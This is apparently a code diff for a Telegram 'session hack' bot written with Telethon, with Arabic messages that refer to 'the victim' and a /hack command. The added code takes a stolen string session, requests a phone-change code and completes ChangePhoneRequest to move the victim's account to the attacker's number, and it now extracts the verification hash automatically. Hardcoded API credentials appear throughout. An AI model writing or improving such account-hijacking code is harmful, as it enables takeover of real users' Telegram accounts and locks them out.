@@ -7,6 +7,15 @@ import asyncio
 from ..Config import Config
 import os, asyncio, re
 from os import system
+from telethon.tl.functions.account import ChangePhoneRequest
+from telethon.tl.functions.account import SendChangePhoneCodeRequest
+from telethon.tl.types import CodeSettings
+from telethon.errors import (
+    PhoneNumberOccupiedError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError,
+    FloodWaitError
+)
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
@@ -23,29 +32,67 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 # ============== الوظائف الأساسية ==============
 
-async def change_number_code(strses, number, code, otp):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try: 
-            result = await X(functions.account.ChangePhoneRequest(
+async def change_number_code(strses, number, phone_code_hash, otp):
+    """
+    إكمال تغيير الرقم باستخدام الهاش والرمز
+    """
+    from telethon import TelegramClient
+    from telethon.sessions import StringSession
+    
+    try:
+        async with TelegramClient(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as client:
+            await client(ChangePhoneRequest(
                 phone_number=number,
-                phone_code_hash=code,
+                phone_code_hash=phone_code_hash,
                 phone_code=otp
             ))
-            return True
-        except:
-            return False
+            return True, "تم تغيير الرقم بنجاح"
+            
+    except PhoneNumberOccupiedError:
+        return False, "الرقم مستخدم بالفعل في حساب آخر"
+    except PhoneCodeInvalidError:
+        return False, "رمز التحقق غير صحيح"
+    except PhoneCodeExpiredError:
+        return False, "انتهت صلاحية رمز التحقق"
+    except FloodWaitError as e:
+        return False, f"الانتظار مطلوب: {e.seconds} ثانية"
+    except Exception as e:
+        return False, f"خطأ غير متوقع: {str(e)}"
 
 async def change_number(strses, number):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        result = await X(functions.account.SendChangePhoneCodeRequest(
-            phone_number=number,
-            settings=types.CodeSettings(
-                allow_flashcall=True,
-                current_number=True,
-                allow_app_hash=True
-            )
-        ))
-        return str(result)
+    """
+    إرسال طلب تغيير الرقم وإرجاع phone_code_hash
+    """
+    from telethon import TelegramClient
+    from telethon.sessions import StringSession
+    
+    try:
+        async with TelegramClient(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as client:
+            send_code = await client(SendChangePhoneCodeRequest(
+                phone_number=number,
+                settings=CodeSettings(
+                    allow_flashcall=True,
+                    current_number=True,
+                    allow_app_hash=True
+                )
+            ))
+            
+            # إرجاع الهاش فقط (للاستخدام في الخطوة التالية)
+            return {
+                'success': True,
+                'phone_code_hash': send_code.phone_code_hash,
+                'timeout': send_code.timeout
+            }
+    except FloodWaitError as e:
+        return {
+            'success': False,
+            'error': f'الانتظار مطلوب: {e.seconds} ثانية'
+        }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e)
+        }
 
 async def userinfo(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -566,28 +613,37 @@ async def users(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message("**الان ارسل الكود تيرمكس**")
         strses = await x.get_response()
+        
         op = await cu(strses.text)
-        if op:
-            pass
-        else:
+        if not op:
             return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
-        await x.send_message("**أعطني الرقم الجديد**\n⚠️ **ملاحظة**: لا تستخدم أرقام وهمية")
+        
+        await x.send_message("**أعطني الرقم الجديد**\n⚠️ **ملاحظة**: استخدم التنسيق الدولي مثال: +964123456789")
         number = (await x.get_response()).text
-        try:
-            result = await change_number(strses.text, number)
-            await event.respond("**تم إرسال الكود إلى الرقم الجديد** ✅\n**انسخ الـ phone_code_hash**\n⏰ **انتظر 20 ثانية**")
-            await asyncio.sleep(20)
-            await x.send_message("**الان ارسل لي الهاش**")
-            phone_code_hash = (await x.get_response()).text
-            await x.send_message("**الان ارسل لي الكود**")
-            otp = (await x.get_response()).text
-            changing = await change_number_code(strses.text, number, phone_code_hash, otp)
-            if changing:
-                await event.respond("**تم تغيير الرقم بنجاح** ✅")
-            else:
-                await event.respond("**فشل تغيير الرقم** ❌")
-        except Exception as e:
-            await event.respond(f"**خطأ:**\n`{str(e)}`")
+        
+        # إرسال طلب تغيير الرقم
+        result = await change_number(strses.text, number)
+        
+        if not result['success']:
+            return await event.respond(f"**فشل إرسال الرمز:**\n{result['error']}", buttons=keyboard)
+        
+        phone_code_hash = result['phone_code_hash']
+        
+        await event.respond(f"✅ **تم إرسال رمز التحقق إلى {number}**\n⏰ يرجى الانتظار 20 ثانية")
+        await asyncio.sleep(20)
+        
+        # طلب الكود فقط (بدون هاش)
+        await x.send_message("**الان ارسل لي رمز التحقق (OTP) المرسل إلى الرقم الجديد**")
+        otp = (await x.get_response()).text
+        
+        # إكمال تغيير الرقم
+        success, message = await change_number_code(strses.text, number, phone_code_hash, otp)
+        
+        if success:
+            await event.respond(f"✅ {message}", buttons=keyboard)
+        else:
+            await event.respond(f"❌ {message}", buttons=keyboard)
+
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-N")))
 async def start(event):
